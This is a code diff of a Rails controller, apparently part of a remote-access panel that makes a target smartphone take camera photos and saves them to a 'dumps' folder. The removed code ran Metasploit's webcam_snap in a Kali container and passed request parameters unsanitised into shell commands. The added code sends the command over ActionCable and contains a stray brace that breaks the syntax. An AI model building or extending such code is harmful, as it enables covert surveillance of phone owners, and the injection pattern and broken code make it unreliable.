@@ -1,53 +1,58 @@
 class PicturesController < InheritedResources::Base
+  include CommandSender
+  
   def take_picture
     begin
-      fileName = params[:filename].to_s
-      commandTimeout = params[:exec_timeout].to_i
-      downloadTimeout = params[:copy_timeout].to_i
-      camera = params[:back_camera] == "true" ? "1" : "2"
-      quality = params[:quality].to_s
       @smartphone = Smartphone.find(params[:smartphone_id])
       currentTime = DateTime.now
       currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
-      @fileName = fileName.empty? ?
-        "webcam_snap_" + currentTimeFormat + ".jpeg" :
-        fileName + ".jpeg"
-      processCommand = "webcam_snap -q #{quality} -i #{camera} -p #{@fileName}"
-      commandOutput = start_msf_process(processCommand)
-      1.upto(commandTimeout) do |n|
-        if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
-          break
+      fileName = params[:filename].to_s
+      camera = params[:back_camera] == "true" ? "0" : "1" # 0=back, 1=front
+      @fileName = fileName.empty? ? "webcam_snap_#{currentTimeFormat}.jpeg" : "#{fileName}.jpeg"
+      
+      # Send take_photo command via ActionCable
+      pending_command = send_command_and_wait(
+        @smartphone, 
+        'take_photo', 
+        { camera_id: camera }, 
+        timeout: 30.seconds
+      )
+      
+      if pending_command.completed?
+        photo_data = pending_command.response_data
+        
+        if photo_data['image_base64'].present?
+          # Decode Base64 and save to file
+          image_bytes = Base64.decode64(photo_data['image_base64'])
+          file_path = Rails.root.join('files', 'dumps', 'pictures', @fileName)
+          FileUtils.mkdir_p(File.dirname(file_path))
+          File.binwrite(file_path, image_bytes)
+          
+          # Save to database
+          Picture.create!(
+            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
+            filename: @fileName,
+            smartphone_id: @smartphone.id
+          )
+          
+          commandOutput = ["Photo captured successfully: #{@fileName} (#{photo_data['size']} bytes)"]
         else
-          puts "Waiting ..."
+          commandOutput = ["Operation Failed: No image data received"]
         end
-        sleep 1
+      else
+        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
+        commandOutput = ["Operation Failed: #{error_msg}"]
       end
-      copyPictureCommand = "docker cp kali_container:/#{@fileName} files/dumps/pictures/#{@fileName}"
-      system(copyPictureCommand)
-      fullPath = "files/dumps/pictures/" + @fileName
-      isOperationSuccessful = false
-      1.upto(downloadTimeout) do |n|
-        if File.file?(fullPath)
-          newPicture = Picture.new(:date => currentTimeFormat.gsub("_", " ").gsub("--", ":"),
-                                   :filename => @fileName,
-                                   :smartphone_id => @smartphone.id)
-          newPicture.save!
-          isOperationSuccessful = true
-          break
-        end
-        sleep 1
-      end
-      commandOutput = ["Operation Failed"] if not isOperationSuccessful
+      
     rescue => e
-      puts "Error on webcam snap."
-      puts e
-      commandOutput = ["Operation Failed"]
+      Rails.logger.error("Error taking picture: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "take_picture",
-               :locals => { :commandOutput => commandOutput,
-                            :fileName => @fileName }
+        render "take_picture", locals: { commandOutput: commandOutput, fileName: @fileName }
+      }
       }
     end
   end
